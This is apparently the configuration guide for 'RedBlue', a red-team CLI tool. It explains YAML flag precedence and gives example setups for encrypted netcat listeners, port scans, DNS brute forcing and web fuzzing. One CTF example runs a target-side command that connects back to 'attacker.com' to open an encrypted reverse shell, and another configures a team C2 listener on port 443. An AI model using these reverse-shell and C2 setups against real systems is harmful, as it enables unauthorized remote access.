# RedBlue Configuration Guide

## 📋 Table of Contents
- [Quick Start](#quick-start)
- [Configuration File](#configuration-file)
- [Priority System](#priority-system)
- [Global Flags](#global-flags)
- [Command-Specific Flags](#command-specific-flags)
- [Examples](#examples)

---

## 🚀 Quick Start

Create a `.redblue.yaml` file in your project directory:

```yaml
# Global settings
verbose: true

# Command-specific settings
commands:
  network.nc.listen:
    encrypt: "my-secret-password"
    delay: 50
    wait: 30
```

Now run without flags:
```bash
rb network nc listen 4444
```

This automatically applies all configured flags!

---

## 📝 Configuration File

RedBlue looks for configuration files in the **current directory**:
- `.redblue.yaml` (preferred)
- `.redblue.yml` (alternative)

### File Structure

```yaml
# ========================================
# GLOBAL FLAGS (apply to ALL commands)
# ========================================
verbose: true
no-color: false
output: json

# ========================================
# COMMAND-SPECIFIC FLAGS
# ========================================
commands:
  # Format: domain.resource.verb
  network.nc.listen:
    encrypt: "password"
    delay: 100

  # Format: domain.resource (applies to all verbs)
  network.nc:
    timeout: 15

  # Format: domain (applies to all resources)
  network:
    verbose: true

# ========================================
# WORDLISTS
# ========================================
wordlists:
  subdomains: /path/to/subdomains.txt
  directories: /path/to/directories.txt
```

---

## 🎯 Priority System

Flags are resolved in the following order (highest to lowest):

1. **CLI Flags** (highest priority)
   ```bash
   rb network nc listen 4444 --encrypt "override"
   ```

2. **Full Command Path** (`domain.resource.verb`)
   ```yaml
   commands:
     network.nc.listen:
       encrypt: "password"
   ```

3. **Resource Level** (`domain.resource`)
   ```yaml
   commands:
     network.nc:
       timeout: 15
   ```

4. **Domain Level** (`domain`)
   ```yaml
   commands:
     network:
       verbose: true
   ```

5. **Global Flags** (lowest priority)
   ```yaml
   verbose: true
   ```

### Example Priority Resolution

Given this config:
```yaml
verbose: true
commands:
  network:
    timeout: 20
  network.nc:
    timeout: 15
  network.nc.listen:
    timeout: 10
```

Running `rb network nc listen 4444`:
- `timeout` will be **10** (from `network.nc.listen`)
- `verbose` will be **true** (from global)

Running `rb network nc listen 4444 --timeout 5`:
- `timeout` will be **5** (CLI overrides everything)

---

## 🌍 Global Flags

Global flags apply to **ALL** commands unless overridden.

### Available Global Flags

```yaml
verbose: true           # Enable verbose output (-v)
no-color: false        # Disable colored output
output: json           # Output format (text|json)
output_file: log.txt   # Write output to file
```

### Example

```yaml
verbose: true
output: json
```

Now every command runs with `--verbose` and `--output json`:
```bash
rb network ports scan 192.168.1.1    # Runs with verbose + json
rb dns record lookup google.com       # Runs with verbose + json
rb web asset get http://example.com   # Runs with verbose + json
```

---

## 🔧 Command-Specific Flags

Command-specific flags apply only to matching commands.

### Netcat Commands

#### Full Example: `network.nc.listen`

```yaml
commands:
  network.nc.listen:
    encrypt: "my-password"      # Cryptcat encryption
    delay: 50                   # Delay between writes (ms)
    line-delay: true            # Only delay after newlines
    wait: 30                    # Idle timeout (seconds)
    keep-open: true             # Accept multiple connections
    timeout: 15                 # Connection timeout
    verbose: true               # Verbose mode
    ipv4: true                  # Force IPv4
```

**Usage:**
```bash
# This command:
rb network nc listen 4444

# Is equivalent to:
rb network nc listen 4444 \
  --encrypt "my-password" \
  --delay 50 \
  --line-delay \
  --wait 30 \
  --keep-open \
  --timeout 15 \
  --verbose \
  --ipv4
```

#### Resource Level: `network.nc`

Apply settings to **ALL** netcat commands (listen, connect, scan):

```yaml
commands:
  network.nc:
    timeout: 15
    verbose: true
```

Now both listen and connect use these settings:
```bash
rb network nc listen 4444     # timeout=15, verbose=true
rb network nc connect host 80 # timeout=15, verbose=true
```

#### Specific Commands

```yaml
commands:
  network.nc.listen:
    encrypt: "server-password"
    keep-open: true

  network.nc.connect:
    encrypt: "client-password"
    delay: 100
```

---

## 📚 Examples

### Example 1: Encrypted CTF Setup

**Scenario:** You're in a CTF and need encrypted reverse shells.

**.redblue.yaml:**
```yaml
verbose: true

commands:
  network.nc.listen:
    encrypt: "ctf-secret-2024"
    keep-open: true
    wait: 300
```

**Usage:**
```bash
# Listener (attacker machine)
rb network nc listen 4444

# Client (target machine)
rb network nc connect attacker.com 4444 --encrypt "ctf-secret-2024"
```

All traffic is encrypted with Twofish-128!

---

### Example 2: Pentest Recon

**Scenario:** Scanning multiple targets with consistent settings.

**.redblue.yaml:**
```yaml
verbose: true
output: json
output_file: scan-results.json

commands:
  network.ports:
    threads: 500
    timeout: 1
    preset: full

  dns.record:
    server: 1.1.1.1
    type: A
```

**Usage:**
```bash
# All commands use your config automatically
rb network ports scan 192.168.1.1
rb network ports scan 10.0.0.1
rb dns record lookup target.com
```

---

### Example 3: Team Collaboration

**Scenario:** Shared config for your red team.

**team-config.yaml:**
```yaml
# Team-wide settings
verbose: true
output: json

commands:
  # C2 infrastructure
  network.nc.listen:
    encrypt: "team-password-2024"
    keep-open: true
    port: 443

  # Subdomain enumeration
  dns.record.bruteforce:
    threads: 100
    wordlist: team-subdomains.txt

  # Web fuzzing
  web.asset.fuzz:
    threads: 200
    wordlist: team-directories.txt
    delay: 10

wordlists:
  team-subdomains: /opt/wordlists/subdomains-10k.txt
  team-directories: /opt/wordlists/directories-common.txt
```

**Usage:**
```bash
# Copy team config
cp team-config.yaml .redblue.yaml

# Everyone uses the same settings
rb network nc listen 443
rb dns record bruteforce target.com
rb web asset fuzz http://target.com
```

---

### Example 4: Per-Project Configuration

**Scenario:** Different configs for different projects.

**Project A (.redblue.yaml):**
```yaml
commands:
  network.nc.connect:
    encrypt: "project-a-secret"
```

**Project B (.redblue.yaml):**
```yaml
commands:
  network.nc.connect:
    encrypt: "project-b-secret"
```

**Usage:**
```bash
cd /projects/project-a
rb network nc connect server 4444  # Uses project-a-secret

cd /projects/project-b
rb network nc connect server 4444  # Uses project-b-secret
```

---

## 🎓 Best Practices

### 1. Use Global Flags for Common Settings
```yaml
verbose: true
output: json
```

### 2. Use Resource-Level for Shared Tool Settings
```yaml
commands:
  network.nc:
    timeout: 15
    verbose: true
```

### 3. Use Full Paths for Specific Workflows
```yaml
commands:
  network.nc.listen:
    encrypt: "listener-password"
  network.nc.connect:
    encrypt: "client-password"
```

### 4. Override When Needed
```bash
# Config has --delay 100, but you want 50 this time:
rb network nc connect host 80 --delay 50
```

### 5. Version Control Your Configs
```bash
# Add to git for team collaboration
git add .redblue.yaml
git commit -m "Add redblue config"
```

---

## 🔒 Security Notes

**⚠️ WARNING:** Config files may contain sensitive data (passwords, API keys).

### Recommendations:

1. **Don't commit passwords to git:**
   ```yaml
   # BAD - password in git
   commands:
     network.nc.listen:
       encrypt: "my-secret-password"
   ```

2. **Use environment variables instead:**
   ```bash
   # Use CLI flag with env var
   rb network nc listen 4444 --encrypt "$NC_PASSWORD"
   ```

3. **Add to .gitignore:**
   ```bash
   echo ".redblue.yaml" >> .gitignore
   ```

4. **Use team config template:**
   ```bash
   # Commit template
   git add .redblue.yaml.template

   # Each team member copies and edits
   cp .redblue.yaml.template .redblue.yaml
   ```

---

## 📖 Full Reference

See `examples/.redblue.yaml` for a complete configuration file with all available options.

